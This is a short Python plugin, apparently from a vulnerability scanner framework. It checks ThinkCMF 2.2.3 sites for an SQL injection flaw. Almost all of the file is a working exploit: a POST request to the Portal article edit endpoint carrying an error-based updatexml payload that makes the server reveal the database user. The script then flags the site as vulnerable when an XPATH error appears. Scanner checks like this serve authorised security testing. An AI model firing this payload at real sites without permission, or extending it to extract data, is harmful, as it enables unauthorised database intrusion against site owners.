#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @author: orleven

from lib.util.aiohttputil import ClientSession
from lib.core.enums import ServicePortMap
from script import BaseScript

class Script(BaseScript):
    """
    thinkcmf 2.2.3 sql
    https://xz.aliyun.com/t/3529
    """

    def __init__(self):
        BaseScript.__init__(self)
        self.service_type = ServicePortMap.WEB

    async def prove(self):
        if self.base_url:
            async with ClientSession() as session:
                for path in self.get_url_normpath_list(self.url):
                    url = path + "index.php?g=Portal&m=Article&a=edit_post"
                    _data = 'term=123&post[post_title]=123&post[post_title]=aaa&post_title=123&post[id][0]=bind&post[id][1]=0 and (updatexml(1,concat(0x7e,(select user()),0x7e),1))'
                    async with session.post(url=url, data=_data) as res:
                        if res != None:
                            text = await res.text()
                            if ':XPATH' in text:
                                yield url
                                
